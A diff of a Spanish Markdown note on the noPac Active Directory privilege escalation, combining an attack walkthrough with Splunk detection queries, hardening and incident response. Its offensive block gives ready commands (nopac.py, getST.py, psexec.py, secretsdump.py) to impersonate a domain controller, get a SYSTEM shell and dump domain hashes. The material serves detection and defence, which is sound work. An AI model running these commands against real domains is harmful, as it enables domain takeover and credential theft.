@@ -16,30 +16,38 @@
 | Fase                | Acción                                                                                                 |
 |---------------------|--------------------------------------------------------------------------------------------------------|
 | **Creación**        | El atacante, con una cuenta cualquiera, crea una cuenta de máquina nueva en el dominio.                |
-| **Manipulación**    | Cambia el nombre/SAMAccountName de la máquina para imitar un DC.                                       |
+| **Manipulación**    | Cambia el nombre/SAMAccountName de la máquina para imitar un DC, o modifica una existente poco vigilada.|
 | **Ticket Kerberos** | Solicita TGT/TGS como esa máquina, engañando al KDC y obteniendo privilegios de administrador de dominio. |
 | **Explotación**     | Usa el ticket para ejecutar comandos como SYSTEM, abrir shells remotas y extraer hashes desde el DC.    |
 | **Limpieza**        | Borra la cuenta de máquina para eliminar huellas.                                                      |
 
 ---
 
-## 💻 Ejemplo práctico
+## 💻 Ejemplo práctico ofensivo (comandos reales)
 
 ```bash
-# Crear cuenta de máquina y cambiar atributos
+# Crear cuenta de máquina y cambiar atributos (nombre de DC)
 python3 nopac.py --action addcomputer --computer-name FAKE-DC$ --computer-pass 'Password123!'
 python3 nopac.py --action modcomputer --computer-name FAKE-DC$ --newname DC01$
+
+# O modificar una cuenta de máquina existente ya creada:
+python3 nopac.py --action modcomputer --computer-name EXISTENTE$ --newname DC01$
 
 # Solicitar TGT como DC comprometido
 getST.py -dc-ip 192.168.1.10 ESSOS.LOCAL/DC01\$ -impersonate administrator
 
-# Usar el ticket para obtener shell como SYSTEM
+# Obtener shell como SYSTEM directamente en el DC
 psexec.py -k -no-pass ESSOS.LOCAL/administrator@dc01.essos.local
+
+# Volcar hashes de todo el dominio
+secretsdump.py -k -no-pass ESSOS.LOCAL/administrator@dc01.essos.local
+
+# Muchos scripts permiten --dump, --shell, etc., para automatizar el proceso
 ```
 
 ---
 
-## 📊 Detección en logs y SIEM
+## 📊 Detección en Splunk
 
 | Evento clave | Descripción                                                                              |
 |--------------|-----------------------------------------------------------------------------------------|
@@ -51,55 +59,35 @@ psexec.py -k -no-pass ESSOS.LOCAL/administrator@dc01.essos.local
 | **7045**     | Creación de servicio remoto (psexec/smbexec, shell persistente)                         |
 | **5140**     | Acceso a recursos compartidos (ADMIN$, SYSVOL)                                          |
 | **4662**     | Cambios en objetos críticos de AD (delegaciones, atributos avanzados)                   |
+| **4738**     | Cambios en cuentas de usuario (si se toca una cuenta de máquina ya existente)           |
 
 ### Query Splunk básica
 
 ```splunk
-index=dc_logs (EventCode=4741 OR EventCode=4742 OR EventCode=4743 OR EventCode=4768 OR EventCode=4769 OR EventCode=4624 OR EventCode=7045 OR EventCode=5140 OR EventCode=4662)
+index=dc_logs (EventCode=4741 OR EventCode=4742 OR EventCode=4743 OR EventCode=4768 OR EventCode=4769 OR EventCode=4624 OR EventCode=7045 OR EventCode=5140 OR EventCode=4662 OR EventCode=4738)
 | sort _time
 | table _time, EventCode, TargetAccountName, SubjectAccountName, host, Client_Address
 ```
 
----
-
-## 🔎 Queries avanzadas de investigación
-
-### 1. Secuencia completa de ataque noPac
+### Cambios en cuentas de máquina existentes
 
 ```splunk
-index=dc_logs (EventCode=4741 OR EventCode=4742 OR EventCode=4743 OR EventCode=4768 OR EventCode=4769 OR EventCode=4624 OR EventCode=7045 OR EventCode=5140 OR EventCode=4662)
-| sort _time
-| transaction TargetAccountName maxspan=30m startswith=(EventCode=4741)
-| table _time, EventCode, TargetAccountName, SubjectAccountName, host, Client_Address
+index=dc_logs EventCode=4742
+| search AttributeName="sAMAccountName" OR AttributeName="servicePrincipalName" OR AttributeName="userAccountControl"
+| table _time, TargetAccountName, SubjectAccountName, AttributeName, OldValue, NewValue, host
 ```
 
-### 2. Cuentas de máquina nuevas que solicitan tickets Kerberos
+### Detección de shell/dump vía creación de servicio y acceso a NTDS.dit
 
 ```splunk
-index=dc_logs (EventCode=4741 OR EventCode=4768 OR EventCode=4769)
-| stats min(_time) as created, max(_time) as ticket_time by TargetAccountName
-| where ticket_time - created < 1800
-```
-
-### 3. Creación y borrado rápido de cuentas de máquina
-
-```splunk
-index=dc_logs (EventCode=4741 OR EventCode=4743)
-| stats min(_time) as created, max(_time) as deleted by TargetAccountName
-| eval diff=deleted-created
-| where diff < 1800
-```
-
-### 4. Servicios remotos y cambios en cuentas de máquina
-
-```splunk
-index=dc_logs (EventCode=7045 OR EventCode=4742)
-| table _time, EventCode, TargetAccountName, SubjectAccountName, host
+index=dc_logs (EventCode=7045 OR EventCode=5140)
+| search (ServiceFileName="*cmd.exe*" OR ServiceFileName="*powershell.exe*" OR Object_Name="*NTDS.dit*")
+| table _time, EventCode, ServiceFileName, Object_Name, SubjectAccountName, host
 ```
 
 ---
 
-## 🦾 Hardening, mitigación y soluciones innovadoras
+## 🦾 Hardening y mitigación
 
 | Medida                                  | Descripción                                                                                      |
 |------------------------------------------|-------------------------------------------------------------------------------------------------|
@@ -107,36 +95,22 @@ index=dc_logs (EventCode=7045 OR EventCode=4742)
 | **Parchear DCs**                         | Aplica todas las actualizaciones acumulativas desde nov/dic 2021 (CVE-2021-42278 y 42287).       |
 | **Alerta por secuencia completa**        | No solo un evento: correlaciona creación, modificación y uso de cuentas de máquina.              |
 | **Honeytokens de máquina**               | Crea cuentas de máquina trampa y alerta si se usan.                                              |
+| **Monitoriza cambios en cuentas existentes** | Detecta 4742 sobre cuentas de máquina antiguas o poco usadas.                                   |
 | **Auditoría avanzada y logs grandes**    | Habilita directivas de auditoría avanzada y sube el tamaño del log de seguridad.                 |
 | **Permisos de delegación restringidos**  | No uses “Permitir delegación a cualquier servicio”. Segmenta y revisa delegaciones periódicamente.|
 | **Monitoriza cambios en msDS-AllowedToActOnBehalfOfOtherIdentity** | Detección avanzada de persistencia oculta.                                     |
-
----
-
-## 🧑‍💻 Comprobación y configuración rápida
-
-### Cambiar MachineAccountQuota a 0
-
-```powershell
-Set-ADObject "CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=essos,DC=local" -Replace @{ms-DS-MachineAccountQuota=0}
-```
-
-### Ver cuentas de máquina creadas recientemente
-
-```powershell
-Get-ADComputer -Filter * | Where-Object { $_.WhenCreated -gt (Get-Date).AddDays(-7) }
-```
+| **Auditoría de scripts y binarios en ADMIN$** | Alerta si aparece un ejecutable no estándar en recursos compartidos administrativos.             |
+| **Restricción temporal**                 | Alerta si un 4742 ocurre fuera de horario laboral.                                               |
 
 ---
 
 ## 🚨 Respuesta ante incidentes
 
-1. **Aísla el DC sospechoso**.
-2. **Resetea o elimina cuentas de máquina anómalas**.
-3. **Purge tickets Kerberos activos** (`klist purge`).
-4. **Revisa creación de servicios y binarios extraños**.
-5. **Informa, documenta y revisa delegaciones y permisos**.
-6. **Haz análisis forense de los artefactos y secuencia de eventos**.
+1. **Aísla inmediatamente cualquier máquina donde veas la secuencia 4742 (sobre cuenta antigua) + 7045/5140.**
+2. **Revoca tickets Kerberos** y resetea la contraseña de la cuenta de máquina afectada.
+3. **Forense de servicios creados y binarios ejecutados en las últimas horas.**
+4. **Analiza cambios de atributos en cuentas de máquina en logs históricos (búsqueda retroactiva).**
+5. **Despliega reglas de detección en tiempo real para cambios de atributos clave.**
 
 ---
 
@@ -145,3 +119,4 @@ Get-ADComputer -Filter * | Where-Object { $_.WhenCreated -gt (Get-Date).AddDays(
 - [noPac - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privilege-escalation/nopac)
 - [Microsoft Security Update Guide](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278)
 - [Impacket](https://github.com/fortra/impacket)
+
